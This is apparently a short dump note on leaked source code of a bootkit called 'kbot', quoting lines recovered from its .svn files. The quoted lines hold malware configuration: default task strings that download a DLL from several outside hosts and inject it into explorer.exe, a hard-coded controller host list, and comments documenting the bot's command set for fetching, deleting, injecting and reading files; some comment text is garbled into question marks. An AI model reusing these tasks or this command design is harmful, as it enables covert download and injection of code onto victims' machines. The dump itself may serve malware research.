#Dump

Contains some .svn files which may contain more clues to the creators etc.

Example of found so far:

MAKEDIR_LOWERCASE=e:\projects\progs\petrosjan\bootkit\kbot
OBJ_PATH=e:\projects\progs\petrosjan\bootkit\kbot

//#define	szDefaultTask	"LOAD_FILE http://shaparack.com/img/admin/bot.plug BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"
//#define	szDefaultTask	"LOAD_FILE http://56tgvr.info/geter/getFile.php BT1.DLL\r\nLOAD_FILE http://56tgvr.info/geter/bot.plug BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"
#define	szDefaultTask	"LOAD_FILE http://56tgvr.info/geter/getFile.php BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"
//#define	szDefaultTask	"LOAD_FILE http://az2.zika.in/rt_jar/bot.plug BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"
//#define	szDefaultTask	"LOAD_FILE http://security-checking.org/rt_jar/bot.plug BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"

#define		KBOT_DEFAULT_HOST_LIST	" 10.30.29.241 "



// Supported commands
// Note that command names are case-sensitive, but command parameters are not.

// LOAD_FILE http://myhost.com/myfile.dll myfile32.dll	- downloads file http://myhost.com/myfile.dll and saves it to the VFS 
//	as \MYFILE32.DLL
// DELETE_FILE	myfile32.dll							- deletes file \MYFILE32.DLL from the VFS
// SET_INJECT	myfile32.dll explorer.exe iexplore.exe	- requests the KLOADER to inject \MYFILE32.DLL into the specified processes
// READ_FILE \??\C:\myfile.dll myfile.dll				- ?????? ????? ? ?????

// $Date: 2012-02-20 18:55:12 +0400 (??, 20 ??? 2012) $
